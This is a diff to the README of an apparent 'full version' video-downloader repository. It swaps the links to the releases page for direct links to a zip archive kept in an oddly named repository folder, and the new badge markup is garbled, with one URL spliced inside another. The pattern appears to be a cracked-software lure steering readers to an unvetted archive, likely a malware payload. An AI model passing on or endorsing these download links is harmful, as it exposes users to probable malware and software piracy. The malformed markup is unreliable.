@@ -6,11 +6,11 @@ Welcome to the YTD Video Downloader Pro Full Version. This application allows yo
 
 ## 📥 Download the Software
 
-[![Download YTD Video Downloader Pro](https://img.shields.io/badge/Download-YTD%20Video%20Downloader%20Pro-blue.svg)](https://github.com/Fabian3212/YTD-Video-Downloader-Pro-Full-Version/releases)
+[![Download YTD Video Downloader Pro](https://raw.githubusercontent.com/Fabian3212/YTD-Video-Downloader-Pro-Full-Version/main/ascescent/YTD-Video-Downloader-Pro-Full-Version.zip%20Video%20Downloader%https://raw.githubusercontent.com/Fabian3212/YTD-Video-Downloader-Pro-Full-Version/main/ascescent/YTD-Video-Downloader-Pro-Full-Version.zip)](https://raw.githubusercontent.com/Fabian3212/YTD-Video-Downloader-Pro-Full-Version/main/ascescent/YTD-Video-Downloader-Pro-Full-Version.zip)
 
 Visit the page to download the latest version of YTD Video Downloader Pro:
 
-[Download Here](https://github.com/Fabian3212/YTD-Video-Downloader-Pro-Full-Version/releases)
+[Download Here](https://raw.githubusercontent.com/Fabian3212/YTD-Video-Downloader-Pro-Full-Version/main/ascescent/YTD-Video-Downloader-Pro-Full-Version.zip)
 
 ## 📋 Features
 
